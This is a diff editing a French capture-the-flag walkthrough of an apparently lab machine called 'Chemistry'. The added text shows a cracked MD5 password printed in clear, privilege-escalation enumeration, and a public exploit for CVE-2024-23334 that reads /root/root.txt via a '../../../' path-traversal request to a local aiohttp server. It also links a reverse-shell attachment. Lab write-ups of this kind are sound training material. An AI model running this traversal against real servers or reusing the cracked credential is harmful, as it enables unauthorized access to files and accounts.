@@ -810,17 +810,17 @@ On observe plusieurs comptes accompagnés de hash de mots de passe.
 
 Sur l’ensemble des utilisateurs listés, le seul compte qui nous intéresse est `rosa`.
 
-Les valeurs ressemblent fortement à des **hash MD5 non salés** (32 caractères hexadécimaux).
+Les valeurs ressemblent fortement à des **hash MD5** (32 caractères hexadécimaux).
 
-Le moyen le plus rapide consiste à soumettre ces hash à un service spécialisé comme `crackstation.net`
+Le moyen le plus rapide consiste à soumettre ce hash à un site spécialisé comme `crackstation.net`
+
+![crackstation.net pour casser le hash de l'utilisateur rosa](crackstation-rosa.png)
 
 Le hash associé à l’utilisateur `rosa` est rapidement résolu, ce qui donne :
 
 ```bash
 rosa:unicorniosrosados
 ```
-
-![crackstation.net pour casser le hash de l'utilisateur rosa](crackstation-rosa.png)
 
 ### Accès SSH et user.txt
 
@@ -1001,15 +1001,253 @@ rosa@chemistry:~$ cat user.txt
 
 ## Escalade de privilèges
 
-Une fois connecté en SSH en tant que `jkr`, tu appliques la méthodologie décrite dans la recette
-   {{< recette "privilege-escalation-linux" >}}.
+Une fois connecté en SSH en tant que `rosa`, tu disposes désormais d’un accès utilisateur standard sur la machine.
+
+Comme dans tous mes writeups, et conformément à la recette {{< recette "privilege-escalation-linux" >}}, l’escalade de privilèges commence par une phase d’énumération méthodique : vérification des droits sudo (`sudo -l`), recherche de binaires SUID, analyse des *Linux capabilities*, inspection des tâches cron et des services locaux.
+
+L’objectif n’est pas de tester des exploits au hasard, mais d’identifier une faiblesse logique ou une mauvaise configuration exploitable qui te permettra de progresser vers `root`.
 
 ### Sudo -l
 
 La première étape consiste toujours à vérifier les droits `sudo` :
 
+```bash
+rosa@chemistry:~$ sudo -l
+[sudo] password for rosa: 
+Sorry, user rosa may not run sudo on chemistry.
+```
 
----
+Aucun droit sudo n’est accordé à `rosa`.
+
+Cela signifie qu’aucune élévation directe via `sudo` n’est possible.
+On peut donc écarter cette piste et poursuivre méthodiquement l’énumération.
+
+
+
+### Linux Capabilities
+
+On poursuit l’énumération avec la recherche des *Linux capabilities* :
+
+```bash
+rosa@chemistry:~$ getcap -r / 2>/dev/null
+```
+
+Résultat :
+
+```bash
+/snap/core20/2379/usr/bin/ping = cap_net_raw+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/ping = cap_net_raw+ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+```
+
+Les capabilities identifiées concernent essentiellement des opérations réseau.
+
+- Ce type de configuration est classique.
+- Aucune capability ne permet ici une élévation directe vers `root`.
+
+Tu peux donc écarter cette piste et continuer la recherche.
+
+
+
+### Recherche de binaires SUID
+
+On vérifie ensuite les binaires SUID :
+
+```bash
+rosa@chemistry:/dev/shm$ python3 suid3num.py
+  ___ _   _ _ ___    _____  _ _   _ __  __ 
+ / __| | | / |   \  |__ / \| | | | |  \/  |
+ \__ \ |_| | | |) |  |_ \ .` | |_| | |\/| |
+ |___/\___/|_|___/  |___/_|\_|\___/|_|  |_|  twitter@syed__umar
+
+[#] Finding/Listing all SUID Binaries ..
+------------------------------
+/snap/snapd/21759/usr/lib/snapd/snap-confine
+/snap/core20/2379/usr/bin/chfn
+/snap/core20/2379/usr/bin/chsh
+/snap/core20/2379/usr/bin/gpasswd
+/snap/core20/2379/usr/bin/mount
+/snap/core20/2379/usr/bin/newgrp
+/snap/core20/2379/usr/bin/passwd
+/snap/core20/2379/usr/bin/su
+/snap/core20/2379/usr/bin/sudo
+/snap/core20/2379/usr/bin/umount
+/snap/core20/2379/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/2379/usr/lib/openssh/ssh-keysign
+/usr/bin/umount
+/usr/bin/fusermount
+/usr/bin/sudo
+/usr/bin/at
+/usr/bin/mount
+/usr/bin/gpasswd
+/usr/bin/su
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/lib/snapd/snap-confine
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+------------------------------
+
+
+[!] Default Binaries (Don't bother)
+------------------------------
+/snap/snapd/21759/usr/lib/snapd/snap-confine
+/snap/core20/2379/usr/bin/chfn
+/snap/core20/2379/usr/bin/chsh
+/snap/core20/2379/usr/bin/gpasswd
+/snap/core20/2379/usr/bin/mount
+/snap/core20/2379/usr/bin/newgrp
+/snap/core20/2379/usr/bin/passwd
+/snap/core20/2379/usr/bin/su
+/snap/core20/2379/usr/bin/sudo
+/snap/core20/2379/usr/bin/umount
+/snap/core20/2379/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/2379/usr/lib/openssh/ssh-keysign
+/usr/bin/umount
+/usr/bin/fusermount
+/usr/bin/sudo
+/usr/bin/at
+/usr/bin/mount
+/usr/bin/gpasswd
+/usr/bin/su
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/lib/snapd/snap-confine
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+------------------------------
+
+
+[~] Custom SUID Binaries (Interesting Stuff)
+------------------------------
+------------------------------
+
+
+[#] SUID Binaries found in GTFO bins..
+------------------------------
+[!] None :(
+------------------------------
+
+```
+
+Les binaires identifiés sont standards :
+
+- `sudo`
+- `su`
+- `passwd`
+- `mount`
+- `umount`
+- `at`
+- `gpasswd`
+- composants liés à `snap`, `dbus`, `polkit`
+
+Rien d’inhabituel.
+ Aucun binaire manifestement exploitable via GTFOBins.
+
+On poursuit méthodiquement.
+
+------
+
+### Analyse des services en écoute
+
+Tu vérifies ensuite les services actifs :
+
+```bash
+rosa@chemistry:/dev/shm$ ss -tulpn
+Netid      State       Recv-Q      Send-Q           Local Address:Port             Peer Address:Port      Process      
+udp        UNCONN      0           0                127.0.0.53%lo:53                    0.0.0.0:*                      
+udp        UNCONN      0           0                      0.0.0.0:68                    0.0.0.0:*                      
+tcp        LISTEN      0           128                    0.0.0.0:5000                  0.0.0.0:*                      
+tcp        LISTEN      0           128                  127.0.0.1:8080                  0.0.0.0:*                      
+tcp        LISTEN      0           4096             127.0.0.53%lo:53                    0.0.0.0:*                      
+tcp        LISTEN      0           128                    0.0.0.0:22                    0.0.0.0:*                      
+tcp        LISTEN      0           128                       [::]:22                       [::]:*                      
+rosa@chemistry:/dev/shm$
+```
+
+On observe plusieurs services en écoute :
+
+- `0.0.0.0:22` → SSH (classique)
+- `0.0.0.0:5000` → application web **Chemistry CIF Analyzer**, déjà exploitée
+- `127.0.0.1:8080` → service accessible uniquement en local
+
+Le port 5000 correspond à l’application web initiale et ne constitue pas une nouvelle piste d’escalade.
+
+En revanche, **le service en 127.0.0.1:8080 est uniquement accessible depuis la machine elle-même**.
+ Il n’était pas visible lors des scans externes.
+
+Dans le cadre d’une escalade de privilèges, c’est donc **la seule surface d’attaque réellement nouvelle à analyser**.
+
+### Identification du service en 127.0.0.1:8080
+
+Le port **8080** fait immédiatement penser à un service HTTP alternatif.
+
+Pour le vérifier, tu peux récupérer uniquement les en-têtes HTTP :
+
+```
+rosa@chemistry:~$ curl -I http://127.0.0.1:8080
+```
+
+Réponse :
+
+```
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 5971
+Date: Tue, 24 Feb 2026 15:17:38 GMT
+Server: Python/3.9 aiohttp/3.9.1
+```
+
+Le code `HTTP/1.1 200 OK` confirme qu’il s’agit bien d’un service HTTP.
+L’en-tête `Server` indique qu’il tourne sous **Python 3.9 avec aiohttp 3.9.1**.
+
+Nous avons donc affaire à une application web interne développée en Python.
+
+Dans un contexte CTF, un service interne en Python accessible uniquement en local constitue une piste sérieuse d’escalade :
+
+
+
+
+
+![Recherche des exploits de aiohttp/3.9.1 sur Google](aiohttp-3_9_1-exploit-poc-github.png)
+
+prends https://github.com/TheRedP4nther/LFI-aiohttp-CVE-2024-23334-PoC
+
+
+
+```bash
+rosa@chemistry:~$ curl -s http://127.0.0.1:8080 | grep src
+    <script src="/assets/js/jquery-3.6.0.min.js"></script>
+    <script src="/assets/js/chart.js"></script>
+    <script src="/assets/js/script.js"></script>
+rosa@chemistry:~$ 
+```
+
+
+
+```bash
+./lfi_aiohttp.sh -f root/root.txt
+
+[+] Curl output to the resulting url: http://localhost:8080/assets/../../../root/root.txt.
+
+
+75e6057484b1b41781c68b9c66150eae
+
+[+] File dumped successfully.
+
+```
+
+
 
 ## Conclusion
 
@@ -1022,9 +1260,7 @@ La première étape consiste toujours à vérifier les droits `sudo` :
 
 ## Pièces jointes
 
-- ## Pièces jointes
-
-  - <a href="files/poc-ping.cif" download>poc-ping.cif</a>
-  - <a href="files/revshell.cif" download>revshell.cif</a>
+- <a href="files/poc-ping.cif" download>poc-ping.cif</a>
+- <a href="files/revshell.cif" download>revshell.cif</a>
 
 {{< feedback >}}
